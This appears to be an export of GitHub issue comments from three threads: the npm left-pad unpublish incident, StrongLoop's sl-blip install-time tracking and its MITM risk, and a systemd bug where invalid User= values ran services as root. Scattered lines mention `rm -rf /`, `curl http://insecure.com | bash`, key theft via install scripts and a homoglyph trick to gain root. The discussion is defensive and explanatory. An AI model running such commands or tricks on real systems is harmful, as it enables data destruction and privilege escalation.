5565	"@deoxxa Yes, and companies should be able to confidently rely on safe harbour, instead of bending to the will of patent lawyers.

The recent Apple v FBI case is a good example of why a company like npm SHOULD be scared - there's no precedents that will guarantee that a company like npm WONT be sued, and have to waste money defending itself, and even if there were, there are too many loopholes for conniving lawyers to try and wiggle their way through.

If the clause was as clear cut as ""only the original publisher of material may be prosecuted"", then we wouldn't have a problem, but RIAA,MPAA would never allow that - it would cut into their bottom line too much.
"
5566	"so everything should be pretty good until Left Pad Inc makes a trademark claim, right?
"
5567	"![screenshot 2016-03-23 10 11 37](https://cloud.githubusercontent.com/assets/1305265/13971954/0f86a07a-f0e0-11e5-97c3-9190ebf00d44.jpg)

Stolen back already: https://www.npmjs.com/package/kik
"
5568	"^ That is definitely not cool on NPMs part.
"
5569	"I think this opens a good discussion for FOSS. What if a package (assuming the dependency was to the last version, instead of a fixed revision) was edited to do something completely different instead of just removed, would it still be okay for an organization to step in and revert it over the author's wishes? At what point do we stop this from becoming a Wikipedia edit war?
"
5570	"@lukebrooker 

![](http://i.imgur.com/1Vji7FA.gif)
"
5571	":warning:  Just a warning, a bunch of other @azer packages just got name squatted on npm by who knows who so watch out when updating your package.json files.
"
5572	"> Just a warning, a bunch of other @azer packages just got name squatted on npm by who knows who so watch out when updating your package.json files.

This is why we can't have nice things.
"
5573	"@Daniel15 actually, the ability to unpublish is why we can't have nice things. Plenty of FOSS package systems out there that would handle this just fine.
"
5574	"More tools for Github issues they said.  Will cut down on +1's they said.

Also just leaving this here.
http://ruby-doc.org/core-2.3.0/String.html#method-i-rjust
https://docs.python.org/2/library/string.html#string.zfill
"
5575	"@dolkensp Yeah, to be clear I was referring to other people namesquatting, as the new packages will be pulled in for any package.json whose version range matches. An ideal package management system would be able to tell that the new (namesquatted) package is not signed with the same key as the older package, and at least warn you about it. npm packages aren't verifiable due to the lack of a signature on the packages.
"
5576	"@nijikokun sure, but I was responding to the notion of writing everything trivial yourself to avoid this, not that nothing will ever go wrong. 

I doubt any car manufacturers are going to make their own airbags even though Takata screwed the pooch for millions of drivers. You accomplish much more by leveraging the work of others. Yes it comes with risks. They are minute compared to the risk of having to reinvent & test every 3rd party library I use. 
"
5577	"> Just a warning, a bunch of other @azer packages just got name squatted on npm by who knows who so watch out when updating your package.json files.

Just going to re-post the list of packages (from @azer's [blog post](https://medium.com/@azerbike/i-ve-just-liberated-my-modules-9045c06be67c#.excaijsng)) to help us validate our builds: https://gist.githubusercontent.com/azer/db27417ee84b5f34a6ea/raw/50ab7ef26dbde2d4ea52318a3590af78b2a21162/gistfile1.txt

Is there a possibility that these packages could turn malicious, and everyone who relied on them is in big trouble after their next `npm install`? :fearful:
"
5578	"@jacksonrayhamilton Yes, it's absolutely possible. NPM modules can run arbitrary commands on installation. 
"
5579	"Can npm run `rm -rf /` ?
"
5580	"Depending on what user you run npm as, yes.
"
5581	"@drewhamlett https://docs.npmjs.com/misc/scripts#current-lifecycle-event see `install` and `postinstall`
"
5582	"@SomeoneWeird  @zerkms  Ok cool.  Thanks.  I guess you would need to run it as sudo for it to work though.
"
5583	"> Is there a possibility that these packages could turn malicious, and everyone who relied on them is in big trouble after their next npm install? :fearful:

Yes: https://news.ycombinator.com/item?id=11341006
"
5584	"@drewhamlett so any module installed in the normal sudo'd global way would be able to do anything. Another good reason to use nvm.
"
5585	"@tlrobinson 2 links to the PR were more than enough, really.
"
5586	"@drewhamlett doesn't stop it wiping out your home directory, including all your ssh keys etc (you have backups, right?)
"
5587	"No, let's post it again! Maybe it'll fix itself!
"
5588	"Here's a quick script to check if you depended on any of @azer's packages (tested with `npm@2.14.7` and `npm@3.7.3`). If you find any, you should confirm they are still safe.

``` bash
#!/usr/bin/env bash
curl https://gist.githubusercontent.com/azer/db27417ee84b5f34a6ea/raw/50ab7ef26dbde2d4ea52318a3590af78b2a21162/gistfile1.txt \
    | sed 's/^\(.*\)$/ \1@/' \
    > ~/suspicious-packages.txt \
    && npm ls \
    | grep -f ~/suspicious-packages.txt
```
"
5589	"@tlrobinson The PR doesn't matter - npm is going to address this issue the same way they addressed long-file-paths in windows - ""Not our problem, go away""
"
5590	"Didn't they address long file paths in Windows by releasing a flat node_modules structure? That's the exact pain-staking opposite of ""Not our problem, go away"".
"
5591	"List of number of packages depending on those unpublished by @azer: https://gist.github.com/tlrobinson/05d2354a71f5491d2f5a
"
5592	"> Didn't really expect to spend the last hours of my day cleaning up after another's tantrum.

@aduth so you're happy to use someone's code that they shared with the world for free, and you feel that your investment of $0 entitles you to some standard of service?
"
5593	"@davidmason Oh here we go again.  Thanks a bunch.
"
5594	"If anyone is confused about @davidmason's comment, it was in reference to a now-deleted reply. Anyone who has email notifications turned on in this thread probably has a copy in their inbox.
"
5595	"Open source should not be oppressed. Though it cost others time, you have the reason to do that.
"
5596	"@davidmason the suck it up, you didn't earn it, move on mentality contributes negatively to the validity and trustworthiness of the OSS community. 
"
5597	"@joeandaverde the ""you made it, you have to support the way I use it"" mentality contributes negatively to the experience of being a part of the OSS community.
"
5598	"Safe harbor just means that NPM is safe (somewhat) from prosecution even if someone hosts copyrighted works on NPM. It doesn't mean they don't have to act on behalf of trademark / copyright owners.
"
5599	"@jacksonrayhamilton thanks for the script; I made a tweak to output the full install path for any of @azer's packages found in a project:

``` bash
#!/usr/bin/env bash
curl https://gist.githubusercontent.com/azer/db27417ee84b5f34a6ea/raw/50ab7ef26dbde2d4ea52318a3590af78b2a21162/gistfile1.txt \
    | sed 's/^\(.*\)$/\/\1$/' \
    > ~/suspicious-packages.txt \
    && npm ls --parseable \
    | grep -f ~/suspicious-packages.txt
```

This gave me the output:

``` bash
/Users/jackwanders/some-project/node_modules/babel/node_modules/babel-core/node_modules/line-numbers/node_modules/left-pad
```

Hopefully this might help others determine how to proceed if they are relying on any of these packages.
"
5600	"Surely Kik could have just spent 5 seconds to realise that the NPM package had nothing to do with anything related to them.  Solid effort on notifying a bunch of people as to what happened though.

Like others have said, his code can do what he wants with it, it's open source if you wish to republish then do so, rather than complain.
"
5601	"Our build job caught that `left-pad` issues fortunately and we ended up upgrading one of our npm modules to its latest version which solve the problem, and my co-worker just `swear` in the team chatroom :)
"
5602	"This is a great example of why decentralizing the package hosting can solve the problem. If package hosting were done via a technology such as zeronet and torrents, this could be entirely avoided. 

I'll be looking into this in the coming months. 
"
5603	"@azer transfer the module to me please :smile: since I'm the only other author of the module :grinning: 
"
5604	"https://github.com/azer/left-pad/graphs/contributors
"
5605	"@stevemao is the new owner of the module, not sure how he can take the npm ownership. 
"
5606	"Thanks @azer :+1: 
"
5607	"Thanks @azer, you did right thing which makes us understand how the npm is dangerous to us, open source developers. You did perfect warning to all the world to tell us do not trust the bullshit npm any more.

To be honest, great work!
"
5608	"@KoryNunn @SomeoneWeird @zerkms @drewhamlett If you run npm as root, it'll `process.setuid()` to a `nobody` user. https://docs.npmjs.com/misc/scripts#user
"
5609	"@isaacs that is really good. There are however many other malicious things that can be done without sudo, like grabbing private keys.
"
5610	"We're with you @azer!

https://medium.com/@azerbike/i-ve-just-liberated-my-modules-9045c06be67c#.eww19oprb
"
5611	"I don't wanna imagine what happens when tomorrow someone trademarks **Lodash** and wreaks havoc. :boom: 

Maybe it's time to add an exclusion clause to Open Source licenses for companies like Kik?

BTW: Ask one of 80 million germans about Kik and they'll recognize a completely [different company](http://www.kik.de/).
"
5612	"@f teşekkür ederim anlayışın ve desteğin için Fatih :) 
"
5613	"This is why Docker exists. Because dependency management is trouble. Pack it all into one package. Do we need a Docker for JS?
"
5614	"1.1.0 is released :)
"
5615	"Oh, is that what blip.strongloop.com is? This is severely affecting us too.
"
5616	":-1: 
"
5617	"-1
"
5618	":-1: 
"
5619	"Just so you guys know, this affects us even when blip.strongloop.com is up because we are behind a firewall that does not allow connections to blip.strongloop.com.
"
5620	":-1: 
"
5621	"![blip](http://cdn.meme.li/instances/51019400.jpg)
"
5622	":-1:
"
5623	":-1: 
"
5624	"blip problem still annoying
"
5625	"https://github.com/strongloop/loopback/issues/1389

Is blip still annoying and affecting the installation 'experience' of loopback?
"
5626	"I got time to test my self this evening: still an ""issue""

```
ob_000@OB-X1-CARBON ~/tmp
$ npm install loopback
npm ERR! fetch failed http://blip.strongloop.com/loopback@2.18.0
npm WARN retry will retry, error on last attempt: Error: connect ECONNREFUSED
 etc etc long time etc etc
```

---

The basic workaround is to:``

```
npm install loopback --no-optional
# and then the installation is sooo quick
```

---

I wonder why optional is not an option: why are optional components installed as default? npm problem
Why are the optional components needed in the package.json at all: they should be optional like so many other things, npm install theOptionalStuff
"
5627	"Optional doesn't mean that it won't install by default, just that it won't
abort the install if it fails.
On May 21, 2015 2:47 PM, ""Owen Brotherwood"" notifications@github.com
wrote:

> I got time to test my self this evening: still an ""issue""
> 
> ob_000@OB-X1-CARBON ~/tmp
> $ npm install loopback
> npm ERR! fetch failed http://blip.strongloop.com/loopback@2.18.0
> npm WARN retry will retry, error on last attempt: Error: connect ECONNREFUSED
>  etc etc long time etc etc
> 
> ---
> 
> The basic workaround is to:``
> 
> npm install loopback --no-optional
> 
> # and then the installation is sooo quick
> 
> I wonder why optional is not an option: why are optional components
> installed as default? npm problem
> Why are the optional components needed in the package.json at all: they
> should be optional like so many other things, npm install theOptionalStuff
> 
> —
> Reply to this email directly or view it on GitHub
> https://github.com/strongloop/loopback/issues/1079#issuecomment-104400925
> .
"
5628	"Yep: but it is loopback that has defined that the module should be in package.json.

npm does it's job (even though a bit illogical with optional being non-optional by default)

There are so many other modules that one has to install by purpose (ie optional to the working of loopback) but not ""the blip""

@STRML possible edit Issue title to something about ""the blip"" should be installed by purpose as an extension of loopback ...

Edit: I wrote ""npm problem"" in my previous comment, I really meant that it was the way npm was being used/abused (opionionated)
"
5629	"I agree, I think they are abusing `optionalDependencies` here in order to track users; it is user-hostile.
"
5630	"@STRML I would _probably_ say ""not thoughtfull"".
I do not know what the functionality is (yet).
"
5631	"---

### End User Experience

There is a considerable time overhead with the current situation of ""the blip"" and installation of loopback where it is not possible to contact ""the blip""

This feature is affecting the installation experience of any user that has to deal with enterprise politics for what is connectable and is related to firewall's

### Solution but with a but

It may be that all the methods used to install loopback allow for a --no-optional flag, and that there are no conflicts. 

---

### Possible workaround

In the meantime ...
... adding a host entry for 127.6.6.6 for blip.strongloop.com will shorten the installation time as the initial network connect will not require an  external dns lookup, and a network connect will fail quicker.

Note: if you use blip.strongloop.com for anything else, then this is not the solution for you

---

@crandmck : the workaround or description of the time out is a possible addition to the firewall area of the doc
@crandmck : are you able to give this issue a tag and/or a callout

---

https://github.com/strongloop/strong-build/issues/29
https://github.com/strongloop/loopback/issues/1389

---

Edit:
@sam-github : Thanks
"
5632	"Simply not installing optional dependencies will have side effects you probably don't want, such as not having a loopback explorer: https://github.com/strongloop/loopback-example-app/blob/master/package.json#L22

We'll look to see what options we have for making `npm install` fail faster on unreachable optional dependencies.
"
5633	"For now I'm just setting `blip.strongloop.com` to `127.0.0.1` in /etc/hosts. 

Rather than thinking about a patch to `npm`, would somebody please explain what `blip.strongloop.com` is for and why this optional dependency exists?
"
5634	"The choice of 127.6.6.6 was chosen with care: 127.0.0.1 is sometimes used for listening on and could also be a port that is being used for collecting the tarball by npm (defined in package.json).

In the case of firewall installations, the protocol used for git is often http(s), and the chances of a process listening on 127.0.0.0  increase in a developer environment.
Unknown side effects for development environment

The chances of 127.6.6.6 being used is minimual: better safe than sorry...

---

Edit:
https://github.com/strongloop/strong-pm/blob/master/README.md?#troubleshooting : shows use of 127.0.0.0 with a port === better safe than sorry when such suprises are in store
"
5635	"Understood. I never run anything on 80/443 personally, but I get what
you're advocating.

On 5/22/15 1:11 PM, Owen Brotherwood wrote:

> The choice of 127.6.6.6 was chosen with care: 127.0.0.1 is sometimes
> used for listening on and could also be a port that is being used for
> collecting the tarball by npm (defined in package.json).
> 
> In the case of firewall installations, the protocol used for git is
> often http(s), and the chances of a process being present increase in
> a developer environment.
> Unknown side effects for development environment
> 
> The chances of 127.6.6.6 being used is minimual: better safe than sorry...
> 
> —
> Reply to this email directly or view it on GitHub
> https://github.com/strongloop/loopback/issues/1079#issuecomment-104733546.
"
5636	"@ritch @bajtos Would like to see some movement on this user-hostile abuse of `optionalDependencies`. Not only has it caused many install problems for our servers behind firewalls, but it is also downloading from a non-secure URL, meaning it's a possible MITM vector. Given how npm packages support `postinstall`, anyone MITMing `blip.strongloop.com` gets code execution on any server running `npm install` and using a strongloop package.
"
5637	"@raymondfeng Deep issues with some organisational aspects StrongLoop / Loopback or just time to fix?
"
5638	"@STRML you should patch the inconvenience and submit a PR. Since you already know the POC attack, you are the most suited to contribute so we all can benefit. 

That's what open source is about, isn't it?
"
5639	"@amenadiel This is not like other contributions, where there is an implementation cost. I am asking them to delete a line from the package.json of every strongloop project. Submitting a PR will only fragment the discussion.
"
5640	"This also kills installs with alternate package managers like [ied](http://gugel.io/ied/).

Time to fork every strongloop package - what a pain.
"
5641	"-1 for the need to fork 
"
5642	":-1: 
"
5643	":-1: 
"
5644	"This probably should have been closed by strongloop/strong-tools#42 a couple weeks ago.
"
5645	" :-1:
"
5646	":-1:
"
5647	":-1:
"
5648	"@rmg It appears the new scheme:
1. Avoids use of optionalDependencies, blocking `npm install`, and closes the mitm vuln, which is good,
2. Adds an `.sl-blip.js` to every git repo. This is good, at least we can see what is happening.
3. Times out after 500ms, so it won't significantly block installs on production servers that don't have internet access,
4. Has not actually been deployed to any projects I can find, so this issue should remain open, and,
5. My major complaint: does not prompt the user to see if they opt-in to tracking. I doubt that users want their production servers hitting your (still **insecure**) endpoints.

Why not use [npm analytics](https://api.npmjs.org/downloads/point/last-day/loopback)?
"
5649	"The entire concept is overtly hostile to enterprise IT... It's stuff like this that hinders Node.js adoption in big companies like IBM.

I work at a Fortune 50 company. We run our own internal npm registries. We don't allow packages with GitHub dependencies (only versions tagged on npm). We shrinkwrap our application and audit version changes carefully.

We don't want our developer machines contacting the outside world. We don't want our build servers contacting the outside world. We can't use any StrongLoop code that contains this tracker.
"
5650	"Did I miss your sarcasm, or are you unaware that StrongLoop _is_ IBM?
"
5651	"I thought it was a creative way to get some attention to this issue... :) My apologies for any confusion.
"
5652	":-1: 
"
5653	"_This isn't an official StrongLoop or IBM response, just my own thoughts/opinions._

---

@STRML thanks for the feedback, and for looking at what has been done.

> Has not actually been deployed to any projects I can find, so this issue should remain open, and,

Unfortunately this is all happening in the middle of a code freeze that is beyond our control, so the rollout is being hampered by that :-(

> My major complaint: does not prompt the user to see if they opt-in to tracking. I doubt that users want their production servers hitting your (still insecure) endpoints.

My original thought was that I didn't want to incur any additional latency and that it wasn't a concern anyway since nothing was actually being downloaded, but that was my mistake. Thanks for catching that, I'll make sure it is updated before it is used.

> Why not use npm analytics?

From my perspective it's mainly a matter of npm stats being at the package level while we wanted them at the version level so we could get an idea of how releases propagate.
"
5654	"Thanks @rmg for the response.

This is a good reason to reach out to the npm developers to see if they will offer a more featureful analytics solution that doesn't involve compromising the trust of your users. It could be a nice product for them to sell for a nominal fee to pay for development.
"
5655	"An official response has been posted on StrongLoop's blog: https://strongloop.com/strongblog/strongloop-and-sl-blip/
"
5656	"> we are working on removing sl-blip in our next release while we find a more elegant and non-intrusive alternative with clearer opt-out options.

Does this mean that the `.sl-blip.js` in strong-tools will not be a part of new packages? 
"
5657	"> Does this mean that the .sl-blip.js in strong-tools will not be a part of new packages?

That's correct.
"
5658	"Great. Thanks. I'll close this issue once the dep has been removed from loopback and related packages and a release has been pushed. It should be backported to the `2.x` branch as a patch as well as it is a serious vulnerability to all consumers of those packages, on par with `curl http://insecure.com | bash`.
"
5659	"nice find
"
5660	"I'm not just experiencing a slow `npm install` step, but my build is failing outright, and I'm not even behind a corporate firewall.  I'm running a loopback app on a Dokku-Alt machine on Digital Ocean, and the build suddenly started failing with no explanation, right after outputting `node .sl-blip.js`.  I've already tried changing the `etc/hosts` file so that `blip.strongloop.com` points to my own machine. but it didn't help.

`npm install` works fine locally, fwiw.

I tried deploying to a vanilla Dokku instance, ( via the one-click-app tool in Digital Ocean ) and it also failed in the same way.  The weird thing is, I deployed to Heroku and it passed this step and finished the build.  Ideally I don't have to migrate to Heroku, though.  Any insights?

My next move is to try https://github.com/strongloop/strong-tools/pull/42/commits.  <-- has this fixed the issue for other folks?
"
5661	"@bradwbradw if the build is stopping suddenly without warning it may be that your environment doesn't have enough memory. The blip stuff was always optional, so even if it failed then `npm install` would just keep on going.
"
5662	"@rmg thanks, i'll look into that
"
5663	"@rmg He's already running the new scheme (note `node .sl-blip.js`). The new scheme isn't optional in the same sense, it's a preinstall hook, which blocks `npm install` until it exits. If it fails for some unknown reason, it'll stop or hang the whole build.

Not sure how many user complaints your team needs to realize that blip has been a user-hostile decision from the start.
"
5664	"Hello everybody, I searched for all LoopBack projects with `sl-blip` in their dependencies, removed `sl-blip` from `package.json` and published new versions.

Here is the list of updated packages:
- loopback@2.27.0
- loopback-component-push@1.5.3
- loopback-component-storage@1.7.0
- loopback-connector-remote@1.2.0
- loopback-connector-soap@2.3.1
- loopback-connector-mssql@2.4.1
- loopback-connector-mysql@2.2.1
- loopback-connector-postgresql@2.4.1
- loopback-connector-oracle@2.3.1
- loopback-connector-sqlite3@1.1.1
- loopback-connector-rest@1.10.2
- loopback-component-oauth2@2.3.7

I hope that makes this issue resolved.

However, if anybody finds a `loopback-` package that still installs sl-blip, then please leave a comment here asking me (my GH handle) to fix it.

Thank you all for the patience you had while waiting for us to address this issue.
"
5665	"> I'll close this issue once the dep has been removed from loopback and related packages and a release has been pushed.

@STRML I'll leave it up to you to close this issue when you agree we are done here.
"
5666	"+1 nice to hear that.... <3
"
5667	"Thanks @bajtos. Is the plan no longer to do the https ping via `.sl-blip.js`? As innocuous as that seems, I've already seen issues popping up where it's stalling builds.
"
5668	"@STRML removing the deps prevents the release tool from replacing it with the script version. That means sl-blip will be completely removed in any form from the packages :-)
"
5669	"@rmg So does this mean that loopback will no longer be collecting this type of analytics? I see blip is still maintained in strong-tools. What's the plan for the future?
"
5670	"@STRML it's dead as far as I know. I just didn't want to leave the code in a broken state, even if it isn't being used.
"
5671	"> So does this mean that loopback will no longer be collecting this type of analytics

Yes, that's correct.
"
5672	":+1: Thank you for finally doing the right thing. It is unfortunate that it took a full year to do so.
"
5673	"Yes, as you found out ""0day"" is not a valid username. I wonder which tool permitted you to create it in the first place. Note that not permitting numeric first characters is done on purpose: to avoid ambiguities between numeric UID and textual user names.

systemd will validate all configuration data you drop at it, making it hard to generate invalid configuration. Hence, yes, it's a feature that we don't permit invalid user names, and I'd consider it a limitation of xinetd that it doesn't refuse an invalid username.

So, yeah, I don't think there's anything to fix in systemd here. I understand this is annoying, but still: the username is clearly not valid.

I hope that makes sense?"
5674	Yeah, thanks.
5675	"Wouldn't it make sense to refuse User=0day then?

In fact, wouldn't it even make sense to refuse User=0x200 or User=01000 rather than User=512 (in other words, to only allow decimal canonical user IDs) for the same reason?

BTW: where does xinetd come in here?"
5676	"> I wonder which tool permitted you to create it in the first place.

It appears that el7 patches shadow-utils-4.1.5.1/libmisc/chkname.c so that it _does_ allow that kind of usernames, explicitly removing the restrictions: https://gist.github.com/bloerwald/a482791395114fa82636e2ab207cdb11 

While it does indeed seem to be a not-a-bug in systemd, one may want to make someone maintaining that el7 patch aware of that the combination of systemd and that patch does pose an issue. 

A patch refusing any `User=` that are invalid would be a nice thing, even if it is not a bug, as noted by @divVerent. That would put the el7 maintainer at the position to explicitly remove that check as well, thinking about their patch allowing usernames without restrictions."
5677	"> I wonder which tool permitted you to create it in the first place.

useradd doesn't complain: [screenshot](http://imgur.com/a/tVs0G)"
5678	Does the POSIX standard deny leading numbers for user names on *nix?
5679	"Tested on Debian with `shadow-utils 4.4` and `adduser 3.115`, only `adduser` complains, `useradd` doesn't.
```
# useradd -m 0day
# userdel -r 0day
userdel: 0day mail spool (/var/mail/0day) not found
# adduser 0day
adduser: Please enter a username matching the regular expression configured
via the NAME_REGEX configuration variable.  Use the `--force-badname'
option to relax this check or reconfigure NAME_REGEX.
```"
5680	"Let's look if it's actually invalid... Probably not because:

>  3.276 Portable Filename Character Set
>The set of characters from which portable filenames are constructed.
>    A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
>    a b c d e f g h i j k l m n o p q r s t u v w x y z
>    0 1 2 3 4 5 6 7 8 9 . _ -
> The last three characters are the period, underscore, and hyphen characters, respectively.

> 3.426 User Name
> A string that is used to identify a user; see also User Database. To be portable across systems conforming to IEEE Std 1003.1-2001, the value is composed of characters from the portable filename character set. The hyphen should not be used as the first character of a portable user name.

http://pubs.opengroup.org/onlinepubs/009695399/basedefs/xbd_chap03.html#tag_03_276

`adduser` will often refuse it tho, e.g. on debian with NAME_REGEX (calling itself ""more conservative by default""), but you can still override that behavior.

So in my humble opinion, it's a valid name and thus systemd has a bug here.

Even if you assume leading numbers are not allowed, systemd running the unit under root is a bug too. It should refuse to run the unit, in particular in the light of:

>systemd will validate all configuration data you drop at it
> -- @poettering https://github.com/systemd/systemd/issues/6237#issuecomment-311900864

This is clearly not the case, `User=0day` is clearly not properly validated and silently ignored and it's still a bug (or it's just put into something like `atoi` and will try to execute `1day` as uid `1`, not sure about that).

So either way, there is a bug here."
5681	hm yes I'll look into it
5682	"I think people are getting distracted with whether or not 0day is a valid name or not.

The real problem here is that the unit is run as root, despite ""0day"" not describing the root user, isn't it?

Can a systemd developer tell: Will a patch that gives an error in this case be accepted? I can get started on it if so."
5683	@rain-1 there's 2 bugs - one is that it is still running as root and the other is that it doesn't support usernames starting with numbers.
5684	I see! please make a separate issue to track the second bug (usernames starting with numbers).
5685	Actually, fix the incorrect user name handling thereby fixing the run-as-root issue too. And we kinda made an issue about that already, namely THIS one.
5686	This is a severe security issue that should be fixed, and assigned a CVE, and not not-a-bug.
5687	@julian-klode you might have misunderstood this bug, it cannot be used for priv. esc.
5688	@rain-1 If the process starts, and you expect it to start a user and not as root, then that is a security issue, because your service suddenly runs as root (and you might not notice it until it is too late).
5689	"So many bugs and issues, and all the time the poettering ignorance... I just cannot stand it...

It does not matter if its free, if you carry such things with it. Sadly the only way leaving it is using devuan..."
5690	"Seems the stuff is parsed using:

- `get_user_creds`:
 https://github.com/systemd/systemd/blob/dd8352659c9428b196706d04399eec106a8917ed/src/basic/user-util.c#L103
- `parse_uid`:
https://github.com/systemd/systemd/blob/dd8352659c9428b196706d04399eec106a8917ed/src/basic/user-util.c#L58
- `safe_atou32` -> `safe_atou`:
https://github.com/systemd/systemd/blob/7e867138f586a7113f43cc6d42f6ce9720489e67/src/basic/parse-util.c#L312
- `strtoul`

Meaning indeed, `User=1day` will try to run with UID 1 as well

**Edit**: See other comments following up on this probably not being the case after all."
5691	"@RealDolos My systemd v232 says: `Invalid user/group name or numeric ID, ignoring: 7oz` and starts the service as root also. Likely because the 7oz as a whole is not a valid number.
```
# /etc/systemd/system/test.service
[Service]
ExecStart=/bin/id
User=7oz
```"
5692	"If a user name is indeed allowed to be made up of digits alone, there has to be a way to distinguish it from a UID. I propose to specify the information in the same way GNU coreutiles does, by appending a + whenever a UID is meant, and otherwise try to resolve to a username first. 

See also: https://www.gnu.org/software/coreutils/manual/coreutils.html#Disambiguating-names-and-IDs"
5693	@UgnilJoZ do you actually have a user with uid 7?
5694	@RealDolos Yes, I just created one for testing ;)
5695	@RealDolos safe_atou checks that it is a valid number, and not a number with something at the end, so the warning here makes sense. But then the bug report is incomplete, because systemd does at least warn about it. I'm not sure it makes sense to start a service if the specified user is invalid, though.
5696	"@julian-klode 
> I'm not sure it makes sense to start a service if the specified user is invalid, though.

That one is easy, in my humble opinion: Same as systemd should not pick and run some random binary when the specified ExecStart is invalid, it shouldn't run a service under a random uid if it cannot find the specified user (uid 0 being the random uid fairly picked by the Debian PRNG, of course)

**PS:** Sorry, @julian-klode, only saw just now that you're actually a Debian dev. My Debian PRNG quip wasn't meant to personally target you."
5697	In https://github.com/systemd/systemd/blob/dd8352659c9428b196706d04399eec106a8917ed/src/basic/user-util.c#L136, the entry is first parsed as a UID, and only if that fails, a lookup for the username is done. To be compliant, this order has to be changed.
5698	"The line which does the hard-coded fallback to root is here:
https://github.com/systemd/systemd/blob/defdbbb6dc62b7985072bfb68e7f8ef3f4c75246/src/shared/condition.c#L172"
5699	@red-hood That's not even remotely true - the code is for ConditionUser, and the line mentioned says that if the user could not be parsed (< 0) that the condition is not met (return 0 => false) - and chasing it down step by step in issue comments is not helping anyone. 
5700	"The 7oz test was perfect. Clearly the issue is not missing validation - in
fact, the safe_atou function does exactly what it should (but it's odd that
some of the functions in the family skip leading whitespace and some don't)
and rejects strings with appended characters. It handles integer overflows
incorrectly though (signed integer overflows, as in safe_atoi, are
undefined behavior), but that's not relevant in this ticket.

The real bug is that invalid User= directives are skipped rather than
rejecting the whole unit. That's actually a lot worse, as it means that a
typo in a username leads to stuff running as root.

Part of this behavior is actually documented in systemd.unit(5):

""Unit files may contain additional options on top of those listed here. If
systemd encounters an unknown option, it will write a warning log message
but continue loading the unit.""

What I can't find documented is that options with invalid values are
""loudly ignored"" too.

Nevertheless, this is indeed a security issue, albeit probably not worth a
CVE. When I can get an admin to install my unit file, I can try to misspell
my user name (e.g. using Unicode characters that look like Latin letters
but actually are Greek or Cyrillic glyphs) - or, for that matter, the name
of the User directive itself - to trick the admin into believing the unit
runs as my user or a role account I ""own"", while it'll actually run as
root. That pathologic user names like here can also trigger this issue is
actually harmless in comparison.

Now how can this broader issue be fixed? Hard. Very hard. Making a valid
User= directive mandatory would be a good start - but this is horribly
backwards incompatible and would at the very least need a long-term plan to
get everyone to migrate their unit files. Revisiting the decision to loudly
ignore invalid directives could work - but I can already imagine  how much
that would break (and it'd mean that a software maintainer who ships unit
files with their software can't attempt to use newly added directives, even
if the software could run without them too).

What about at the very least rejecting unit files that contain non-ASCII
characters in option names, or User= option values? Then an attacker at
least needs a ""visible"" misspelling. Combining that with also causing a
failed User= directive to make the whole unit file rejected would solve the
security issue entirely.

As for the allowed character set in user names - that's a different story.
Once units with invalid names are properly rejected (instead of falling
back to root), I suppose systemd can enforce any policy it wants there and
distributions can override it if they really need to.
"
5701	"> Now how can this broader issue be fixed? Hard. Very hard. Making a valid User= directive mandatory would be a good start - but this is horribly backwards incompatible

Maybe a systemd config option that turns such warning cases into errors? Or like, a config file that enumerates the kinds of errors that should be fatal instead of warnings?"
5702	Sigh, since this now attracting the trolls, I'm locking the conversation.
5703	"Just to summarize things:

1. systemd is not the one coming up with the restrictions on user names, and while some distributions are less restrictive, many do enforce the same restrictions as we do. In order to make systemd unit files portable between systems we'll hence enforce something that resembles more the universally accepted set, rather than accept the most liberal set possible.
2. User= in unit files is about system users, not regular users, and I am pretty sure we should enforce a stricter regime about system users than regular users.
3. In systemd we generally follow the rule that when we encounter a unit setting that does not validate syntax-wise we'll log about it and ignore it, for compat reasons. We do the same for User= here as for all other options. Note that if you specify a valid user name but where the user doesn't exist, then we'll instead fail the service on start, because in that case there's not just something wrong with the syntax the service author used but actually something inconsistent on the system, and that should be considered fatal."
5704	"Agreed about 1 and 2, but I disagree about 3. Setting `User=nonexistinguser` is syntactically correct, just not semantically. It's perfectly legitimate and consistent to ignore unkonwn keys such as `Userr=foo`, but we *don't* have a policy to ignore unknown/invalid values. For example,  if a unit has `Requires=nonexisting.service`, it rightfully fails; we don't just ignore `nonexisting.service`. For the same reason, a unit with `User=nonexistinguser` should fail instead of silently running as root. That's the security relevant bit that we ought to fix.

I agree that not handling user names that start with digits can be considered ""not a bug""."
5705	"> For the same reason, a unit with User=nonexistinguser should fail instead of silently running as root.

That's exactly what happens, and what I wrote above: if the username is valid but the user doesn't exist we'll let the unit fail on start. If the username is already invalid syntax-wise we'll log about it but proceed.

Hence, if you write:

```
User=000fooo...@!
```
Then we'll ignore the assignment altogether (but log about it), since it's syntactically invalid. But if you specify:

```
User=waldo
```

and the user ""waldo"" does not exist (though it is syntactically valid), then we'll accept the setting, but as soon as you actually try to start the unit it will fail with ""user not found""."
5706	Thanks @poettering for the clarification!
5707	Assigned CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-1000082
5708	"User @Roland found that usernames that contain unicode characters also cause this bug.

> The bug also affects usernames that contain unicode characters, which can be created with ""useradd"" without difficulties:
```
# useradd -m pöttering
# id pöttering
uid=1002(pöttering) gid=1003(pöttering) Gruppen=1003(pöttering)

# cat /etc/systemd/system/test-unicode.service
[Service]
User = pöttering
ExecStart = /usr/bin/touch /tmp/foo

# ls -l /tmp/foo
ls: cannot access '/tmp/foo': No such file or directory
# systemctl daemon-reload
# systemctl start test-unicode.service
# ls -l /tmp/foo
-rw-r--r-- 1 root root 0 Jul 3 17:56 /tmp/foo
```
> Why it may be unlikely that an admin creates a username starting with a zero and wants to run a service with it I think this eventually might happen with usernames that contains umlauts or acute accents."
5709	"@haraldh we stick to the portable set, that the majority of distros agrees on, and umlauts in user names don't work on fedora, nor arch... I am pretty sure it works on a small minority of distros only. here's the output i get on fedora:

```
# adduser züpp
adduser: invalid user name 'züpp'
```

Note that fedora/rhel explicitly patch our the upstream rules of shadow-utils:

https://src.fedoraproject.org/cgit/rpms/shadow-utils.git/tree/shadow-4.1.5.1-goodname.patch#n7

Note that neither the upstream nor the fedora rules actually accept umlauts in usernames.

Anyway, systemd is not a tool for generic user management, it's a tool for service management. We make restrictions on the username you may make use of to keep things safe and portable between distributions, hence we stick to the set of user names that are portable, and complain about all others.

